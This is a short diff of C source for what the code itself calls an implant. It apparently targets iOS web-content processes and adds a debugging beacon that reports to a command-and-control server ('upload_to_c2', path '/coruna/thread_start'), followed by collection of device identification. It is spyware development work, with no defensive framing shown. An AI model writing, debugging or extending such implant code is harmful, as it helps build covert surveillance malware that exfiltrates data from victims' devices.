@@ -95,7 +95,18 @@ static bool is_webcontent_process(void) {
 static void *implant_main(void *arg) {
     (void)arg;
 
-    /* Announce ourselves to C2 immediately so the operator knows we loaded. */
+    /*
+     * Diagnostic layer 2: confirms the background pthread is alive and running.
+     * If beacon (layer 1 / process()) appears in logs but this does NOT:
+     *   → pthread_create succeeded but the thread never got scheduled, or the
+     *     process was killed between process() returning and the thread starting.
+     * If neither appears:
+     *   → upload_beacon() in process() already failed (crash / network down).
+     */
+    upload_to_c2("system", "/coruna/thread_start",
+                 "implant thread running v" PAYLOAD_VERSION, "");
+
+    /* Full device identification (includes iOS version, model, build). */
     upload_device_info();
 
     /*
